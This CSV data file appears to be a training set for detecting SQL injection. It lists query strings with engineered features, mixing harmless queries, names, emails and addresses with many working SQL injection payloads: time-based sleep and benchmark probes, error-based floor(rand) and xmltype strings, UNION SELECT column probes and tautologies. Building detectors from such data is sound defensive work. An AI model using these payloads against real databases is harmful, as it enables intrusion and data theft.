,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
8599,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",4,0,21,0,0,25,0,2,1,0,0,42,13,0,2,4.976733742420574,7.335959393126002
22912,select count ( told ) from slowly,0,0,2,0,0,6,0,0,0,0,0,25,0,0,2,3.49650756146648,4.571113592379885
23983,select top 50 percent * from fence select * from explain fetch first 50 percent rows onlyselect top 3 * from down,0,0,3,0,0,21,0,0,3,0,0,84,5,0,6,4.727387818712341,6.827090900265457
12393,luczka graciot,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
13690,naresh,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
2209,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,0,4,15,0,0,16,2,2,0,0,0,14,10,0,0,4.343805421853684,6.0797984693327525
24452,"insert into were  ( tightly, must, house )  values  ( 'weight', 'because', 'mad' )  ",6,0,14,0,0,14,0,0,0,0,0,52,0,0,0,4.430816798843313,6.245637257588747
26081,"  select feelid as id, sick as flag from possible",0,0,1,0,0,9,0,0,0,0,0,38,0,0,1,3.8918202981106265,5.251655965920898
7303,"-5640""   )    )    or 9792  =  2728--",0,1,7,1,0,6,0,1,3,0,0,2,12,0,0,3.610917912644224,4.764024421755989
13381,9.45e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
6768,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,0,12,1,0,19,0,1,2,0,1,26,30,0,0,4.700480365792417,6.77328459478072
22631,select * from save where spread between potatoes09/01/1996we and salmon15/31/1996baseball,0,0,5,0,0,9,0,1,5,0,0,59,16,0,1,4.48863636973214,6.357017110069445
24794,"select * from report where kept between ""powerful"" and    ""route""",0,4,5,0,0,9,0,1,1,0,0,48,0,0,1,4.174387269895637,5.762920220853171
13413,seyler@miami-beach.gw,0,0,3,0,0,0,0,0,1,0,0,18,0,0,0,3.044522437723423,3.839958531231341
5959,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1,0,12,0,0,11,0,0,1,0,0,25,44,0,1,4.574710978503383,6.524589271310591
11127,"-6017 union all select 8449,8449,8449--",0,0,5,1,0,4,0,0,3,0,0,14,16,0,1,3.6635616461296463,4.853884482035236
23854,select * from discussion where brass = 'stage'  and  ( plural = 'men' or gray = 'purple' ) ,6,0,12,0,0,18,0,2,1,0,0,59,0,0,1,4.51085950651685,6.400078810527845
17706,lovejoy,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
5068,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",0,4,14,0,0,24,0,1,0,0,1,42,13,0,1,4.812184355372417,6.9980558521596
11383,lemoine5@informatica2009.zr,0,0,2,0,0,0,0,0,0,0,0,20,5,0,0,3.295836866004329,4.240494654101009
10374,"1 and elt  (  3172  =  7243,7243  )  ",0,0,4,0,0,8,0,1,0,0,0,6,13,0,0,3.610917912644224,4.764024421755989
29475,select slope ( s )  from lying,0,0,2,0,0,6,0,0,0,0,0,21,0,0,1,3.4011973816621555,4.412867051146341
12576,olivio,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
6817,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",0,4,40,0,0,65,0,2,2,0,0,113,55,0,7,5.849324779946859,9.271054811899004
7186,1  )   as imdt where 6431  =  6431,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0,3.5263605246161616,4.621137163019105
30500,"  select classid as id, sport as automobile from feet",0,0,1,0,0,9,0,0,0,0,0,42,0,0,1,3.970291913552122,5.391515666300752
12474,8912,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
12334,1745,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
26012,select * from forth where missing = 'outer',2,0,4,0,0,7,0,0,1,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
16976,finak,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
12577,6$ng4tado,0,0,1,0,0,0,0,0,0,0,0,6,2,0,0,2.19722457733622,2.593591245490939
15610,17853323x,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
8111,1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,0,62,1,0,80,0,11,2,0,0,86,53,10,1,5.926926025970411,9.455470299041224
28251,"   select automobile,balance,younger,substance,blank     (  (  material join leader on president.clock =  strike.captured )   inner join olderon orders.horn =  meal.graphid ) ",0,0,14,0,0,20,0,0,0,0,0,129,0,0,3,5.1647859739235145,7.732268544144516
22348,select nails ( s )  from sick left join,0,0,2,0,0,8,0,0,0,0,0,28,0,0,2,3.6635616461296463,4.853884482035236
618, ( ,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,1.0986122886681098,1.19230319601282
25859,select avg ( bank ) from mother,0,0,2,0,0,6,0,0,0,0,0,23,0,0,2,3.4339872044851463,4.467059038127735
18586,vilamartn de valdeorras,0,0,0,0,0,2,0,0,0,0,0,21,0,0,0,3.1354942159291497,3.983240309714999
1517,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",4,0,18,0,0,17,2,2,1,0,0,8,16,0,0,4.499809670330265,6.378649993862576
12872,7.71e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
17600,4.55e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
959,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao",0,0,13,1,0,20,0,1,3,0,0,69,8,0,2,4.804021044733257,6.981504296139237
16907,deli6escenci1,0,0,0,0,0,0,0,0,0,0,0,11,2,0,0,2.5649493574615367,3.1155015354702966
11551,6.05e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
7219,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,8,0,24,0,0,29,0,4,1,0,0,63,18,0,1,5.099866427824199,7.594214353263836
21173,select shorter from long union all select move from easily order by party,0,0,0,0,0,12,0,0,0,0,0,61,0,0,3,4.290459441148391,5.97916802637938
2385,-6165%'   )    )    union all select 5384#,1,0,6,0,0,6,1,0,1,0,0,14,8,0,1,3.737669618283368,4.981567234930947
25475,"  select * from mark where citizen in  ( 'strip', 'prepare', 'pencil' )  ",6,0,11,0,0,13,0,0,1,0,0,46,0,0,1,4.290459441148391,5.97916802637938
9925,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",0,4,8,0,0,11,0,2,0,0,0,23,2,0,0,4.007333185232471,5.458096843121287
8860,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",3,0,14,0,0,11,0,1,0,7,0,57,9,7,2,4.553876891600541,6.483834243658689
2065,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",5,0,18,0,0,18,1,1,1,0,0,38,10,0,1,4.727387818712341,6.827090900265457
25915,select * from hand where garage = 'fierce',2,0,4,0,0,7,0,0,1,0,0,31,0,0,1,3.737669618283368,4.981567234930947
17309,58743816e,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
8815,1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,4,0,15,0,0,26,0,1,0,0,1,46,13,0,1,4.927253685157205,7.2334909053693135
28544,select lay ( s ) from question inner join,0,0,2,0,0,8,0,0,0,0,0,31,0,0,2,3.713572066704308,4.939896154656966
15858,agote lledos,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
20704,"insert into tall ( oxygen, coach, term, discussion, lake, fall )  values  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",13,0,28,0,0,21,0,0,0,0,0,101,0,0,0,5.030437921392435,7.448022400972698
15211,91328189l,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
1146,"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",0,1,50,1,0,79,0,1,12,0,0,89,55,12,1,5.8971538676367405,9.384469403433624
9446,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""sxih""  =  ""sxih",0,3,16,0,0,22,0,1,1,0,0,36,1,0,2,4.700480365792417,6.77328459478072
16113,pred6.finir,0,0,1,0,0,0,0,0,0,0,0,9,1,0,0,2.3978952727983707,2.8749024412290907
27147,select * from vowel  where layers not like '[nearby]%',2,0,6,0,0,8,1,1,1,0,0,39,0,0,1,3.9889840465642745,5.42506920217274
21823,select * from wide where upward not like '[deep]%',2,0,6,0,0,8,1,1,1,0,0,36,0,0,1,3.912023005428146,5.287509109454676
17056,lacruz morey,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
27249,select * from folks where activity in  ( select frozen from did ) ,0,0,3,0,0,13,0,0,1,0,0,49,0,0,2,4.189654742026425,5.791153910047609
27108,"insert into exist  ( syllable, strength, behavior )  values  ( 'specific', 'greater', 'vast' )  ",6,0,14,0,0,14,0,0,0,0,0,64,0,0,0,4.564348191467836,6.504302289710709
21253,select avg ( price ) from red,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
26798,from  ( select distinct six from thrown ) ,0,0,2,0,0,8,0,0,0,0,0,31,0,0,1,3.737669618283368,4.981567234930947
8436,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",0,0,13,0,0,17,0,0,0,1,0,38,14,2,0,4.584967478670572,6.544698632292425
12038,boci+o,0,0,1,0,0,0,0,0,1,0,0,5,0,0,0,1.791759469228055,2.0498957009511405
17328,vies canales,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
1394,"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",0,1,67,0,0,87,0,14,0,0,0,101,51,13,2,5.981414211254481,9.586221732537773
6832,1%'  )   and 4595  =  4595#,1,0,5,0,0,5,1,1,0,0,0,3,9,0,0,3.295836866004329,4.240494654101009
2523,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",0,1,13,1,0,4,0,0,3,0,0,14,44,0,1,4.31748811353631,6.030055566276218
15593,ocaa,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
26444,select top 50 percent * from vote select * from simplest fetch first 50 percent rows onlyselect top 3 * from test,0,0,3,0,0,21,0,0,3,0,0,84,5,0,6,4.727387818712341,6.827090900265457
24611,select earlier ( s )  from water left join,0,0,2,0,0,8,0,0,0,0,0,31,0,0,2,3.737669618283368,4.981567234930947
29703,"  select * from cotton where kids not in  ( 'within', 'connected', 'pattern' )  ",6,0,11,0,0,14,0,1,1,0,0,52,0,0,1,4.382026634673881,6.152384767567401
8932,-3982   )    )    or 6872  =  6872 and    (    (   6331  =  6331,0,0,7,0,0,12,0,2,1,0,0,5,20,0,0,4.158883083359672,5.734313559436426
28602,select min ( she )  as his from spell,0,0,2,0,0,8,0,0,0,0,0,26,0,0,1,3.610917912644224,4.764024421755989
27999,select * from constantly,0,0,1,0,0,3,0,0,1,0,0,20,0,0,1,3.1780538303479458,4.05093304771096
6983,"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",4,0,13,0,0,13,0,2,1,0,0,20,16,0,0,4.343805421853684,6.0797984693327525
16260,chuvalo@ppmanzanares.nc,0,0,2,0,0,0,0,0,0,0,0,21,0,0,0,3.1354942159291497,3.983240309714999
18190,"seca, la",0,0,1,0,0,1,0,0,0,0,0,6,0,0,0,2.079441541679836,2.432300417938136
713," select * from users where id  =  '1' union select +\,@@version -- 1'",3,0,11,1,0,13,0,0,4,0,0,40,2,0,2,4.23410650459726,5.873719016140452
16700,tiramollar,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
29298,select * from exactly where clock = 'wet' limit 3,2,0,4,0,0,9,0,0,1,0,0,35,1,0,1,3.8918202981106265,5.251655965920898
16648,musi@inmobiliariahangar.vn,0,0,2,0,0,0,0,0,0,0,0,24,0,0,0,3.258096538021482,4.179397132269193
2197,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",0,0,30,0,0,45,0,1,2,0,0,97,35,1,4,5.54907608489522,8.577020660447667
5647,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",1,0,10,0,0,5,0,0,1,0,0,14,32,0,1,4.158883083359672,5.734313559436426
21062,"   select produce,wild,nearly,necessary,when     (  (  statement join himself on found.voice =  that.poem )   inner join swepton orders.college =  if.creamid ) ",0,0,14,0,0,20,0,0,0,0,0,114,0,0,3,5.075173815233827,7.542049364654595
26470,select avg ( distant ) from area select sum ( show ) ,0,0,4,0,0,12,0,0,0,0,0,37,0,0,4,3.970291913552122,5.391515666300752
17740,pearce,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
5659,1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,0,0,13,0,0,22,0,2,0,0,0,22,18,0,1,4.736198448394496,6.8447556498973405
14433,"caada de los ingleses, 117,",0,0,2,0,0,4,0,0,0,0,0,18,3,0,0,3.295836866004329,4.240494654101009
7126,"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",0,1,16,0,0,7,1,0,1,0,0,14,44,0,1,4.5217885770490405,6.42130769614405
19919,"  select truncate ( 135.375, 2 ) ;",0,0,5,0,0,7,0,0,0,0,0,14,7,0,1,3.5263605246161616,4.621137163019105
5175,"1%""   )    )     )   and 9198  =  9198--",0,1,8,1,0,7,1,1,2,0,0,3,9,0,0,3.688879454113936,4.897348914472564
8661,1'   )    )    as wdor where 7426  =  7426,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0,3.737669618283368,4.981567234930947
20710,select * from fastened,0,0,1,0,0,3,0,0,1,0,0,18,0,0,1,3.091042453358316,3.9129887722739327
15017,lubna,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
20026,"select subdate ( ""2017-06-15 09:34:21"", interval 15 minute ) ;",0,2,10,0,0,9,0,0,2,0,0,27,16,0,1,4.127134385045092,5.675937336868984
2962,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",3,0,10,0,0,12,0,1,0,0,1,31,15,0,1,4.442651256490317,6.268357393526619
3598,-5580 or 4829  =  1968,0,0,2,0,0,4,0,1,1,0,0,2,12,0,0,3.091042453358316,3.9129887722739327
15358,taboada,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
9518,"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,0,4,77,0,0,94,2,15,0,0,0,104,51,13,2,6.075346031088684,9.81409693389834
2554,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",0,3,9,0,0,11,0,1,0,0,1,31,15,0,1,4.382026634673881,6.152384767567401
9722,"1  )   as mwcs where 2544  =  2544 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,0,25,1,0,38,0,1,3,0,1,55,40,0,3,5.3230099791384085,8.074309346777458
29008,select * from studying where ought not like '[down]%',2,0,6,0,0,8,1,1,1,0,0,39,0,0,1,3.970291913552122,5.391515666300752
27124,select * from attack where unless = 'task' limit 3,2,0,4,0,0,9,0,0,1,0,0,36,1,0,1,3.912023005428146,5.287509109454676
16440,"c/ bellavista, 70 10h",0,0,2,0,0,3,0,0,1,0,0,12,4,0,0,3.044522437723423,3.839958531231341
29046,select these ( s )  from clear select strange ( s ) ,0,0,4,0,0,12,0,0,0,0,0,35,0,0,2,3.951243718581428,5.357417698153898
20345,select avg ( truth ) from electric,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
3917,"1%""   )    )     )   and sleep  (  5  )  #",0,1,8,0,0,9,1,1,0,0,0,8,2,0,0,3.737669618283368,4.981567234930947
12644,august,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
30250,"   select hot, sometime, barefrom earn where touch  is not null",0,0,2,0,0,10,0,1,0,1,0,48,0,1,1,4.143134726391533,5.7053230539652695
22895,select * from collect where please = 'lesson' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,52,1,0,3,4.23410650459726,5.873719016140452
14729,mairozio,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
25001,"  select out as fence, good as [quietly]  from who",0,0,3,0,0,9,0,0,0,0,0,36,0,0,1,3.912023005428146,5.287509109454676
8662,"-7016%""   )    )    union all select 8847,8847,8847--",0,1,9,1,0,6,1,0,3,0,0,14,16,0,1,3.970291913552122,5.391515666300752
12925,7.74e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
26440,select * from  ( select swing from paper ) ,0,0,3,0,0,9,0,0,1,0,0,30,0,0,2,3.7612001156935615,5.022400427811018
15626,fustukian@comercioenlacalle.tf,0,0,2,0,0,0,0,0,0,0,0,28,0,0,0,3.4011973816621555,4.412867051146341
17397,"de l' aliga 3,",1,0,2,0,0,3,0,0,0,0,0,8,1,0,0,2.6390573296152584,3.2241419783899143
9239,"1""  )   union all select null,null,null,null,null,null,null,null--",0,1,11,1,0,5,0,0,2,8,0,46,1,8,1,4.189654742026425,5.791153910047609
23517,select avg ( temperature ) from available select sum ( stretch ) ,0,0,4,0,0,12,0,0,0,0,0,49,0,0,4,4.174387269895637,5.762920220853171
4199,"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,0,4,24,0,0,28,2,2,1,0,0,74,9,0,2,5.111987788356544,7.619891008685505
12871,wailing@mariposasentudia.je,0,0,2,0,0,0,0,0,0,0,0,25,0,0,0,3.295836866004329,4.240494654101009
13150,clodettes_pierson@repretexbcn.ml,0,0,3,0,0,0,0,0,0,0,0,29,0,0,0,3.4657359027997265,4.519779854678687
25831,"   select swim, again, thrown from diameter where driver  is null",0,0,2,0,0,10,0,0,0,1,0,50,0,1,1,4.174387269895637,5.762920220853171
9866,1   )    )    as smtf where 5829  =  5829,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0,3.713572066704308,4.939896154656966
16819,roze,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
7832,"-2860""   )    )    order by 1#",0,1,5,0,0,5,0,0,1,0,0,7,5,0,1,3.4011973816621555,4.412867051146341
11965,thayra,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
1569,1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',4,0,15,0,0,15,2,2,1,0,0,6,13,0,0,4.30406509320417,6.004758445183105
9667,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",0,4,10,0,0,14,0,2,0,0,0,26,10,0,0,4.30406509320417,6.004758445183105
21706,select * from thy fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,31,1,0,3,3.713572066704308,4.939896154656966
590,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,0,0,8,1,0,15,1,1,5,0,0,24,4,0,1,4.04305126783455,5.522643883333643
22768,select * from chapter where nothing = 'time',2,0,4,0,0,7,0,0,1,0,0,33,0,0,1,3.784189633918261,5.062431490914847
17514,40197,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
14237,"cardenal mendoza s/n, 7?h",0,0,3,0,0,3,0,0,1,0,0,18,1,0,0,3.218875824868201,4.116261188933881
23452,from  ( select distinct ice from topic ) ,0,0,2,0,0,8,0,0,0,0,0,30,0,0,1,3.713572066704308,4.939896154656966
8270,1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,0,0,11,1,0,26,0,0,2,0,1,42,21,0,1,4.836281906951478,7.047030967710781
4948,"-1072%""   )    )    or 3090  =  3539",0,1,6,0,0,6,1,1,1,0,0,2,12,0,0,3.58351893845611,4.717530264472627
25216,select dollar,0,0,0,0,0,1,0,0,0,0,0,12,0,0,1,2.5649493574615367,3.1155015354702966
18384,"burgos, 40, 7?a",0,0,3,0,0,2,0,0,0,0,0,7,3,0,0,2.70805020110221,3.326353218260614
10748,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",4,0,10,0,0,14,0,2,0,0,1,30,22,0,0,4.499809670330265,6.378649993862576
16123,2561,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
27693,select * from wing order by control,0,0,1,0,0,6,0,0,1,0,0,28,0,0,2,3.555348061489413,4.669921102482963
6430,"1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--",1,0,10,1,0,11,0,0,2,6,0,49,9,6,1,4.430816798843313,6.245637257588747
